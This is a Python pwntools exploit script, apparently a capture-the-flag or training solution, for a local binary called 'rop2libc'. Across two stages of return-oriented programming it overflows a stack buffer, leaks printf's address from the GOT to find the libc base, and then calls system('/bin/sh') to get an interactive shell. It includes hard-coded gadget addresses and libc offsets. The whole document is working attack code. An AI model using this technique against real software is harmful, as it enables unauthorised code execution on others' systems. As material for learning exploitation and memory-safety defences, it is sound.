#!/usr/bin/env python
from pwn import *

# obtained from readelf -s libc.so.6
offset_printf = 0x054340
offset_system = 0x046590

# obtained from ROPGadget --binary libc.so.6 --strings "/bin/sh"
offset_binsh  = 0x180503

# rop chain 1: printf("%s\n", got_addr); vuln();
buf = ""
buf += "A"*72              # 64 bytes to fill buffer, 8 for rbp
buf += p64(0x400633)       # pop rdi ; ret
buf += p64(0x40065e)       # "%s\n" --> rdi
buf += p64(0x400631)       # pop rsi ; pop r15 ; ret
buf += p64(0x601018)       # printf@got --> rsi
buf += "B" * 8             # blah --> r15
buf += p64(0x400450)       # ret1: printf@plt
buf += p64(0x40057d)       # ret2: vuln()

# stage 1: leak libc address for printf
sh = process("./rop2libc")
sh.sendline(buf)
print sh.recvline()
d = sh.recvline()
print "leak:", d
addr_printf = u64(d[:-1] + '\x00\x00')

print "addr_printf:", hex(addr_printf)

libc_base = addr_printf - offset_printf
print "libc_base:", hex(libc_base)

# local offsets
addr_system = libc_base + offset_system
addr_binsh  = libc_base + offset_binsh

print "system:", hex(addr_system)
print "/bin/sh:", hex(addr_binsh)

# rop chain 2: system("/bin/sh");
buf = ""
buf += "A"*72              # 64 bytes to fill buffer, 8 for rbp
buf += p64(0x400633)       # pop rdi ; ret
buf += p64(addr_binsh)     # "/bin/sh" --> rdi
buf += p64(addr_system)    # ret1: system()

# stage 2: get a shell execve("/bin/sh")
print "trying to get shell..."
sh.sendline(buf)
sh.interactive()
sh.close()
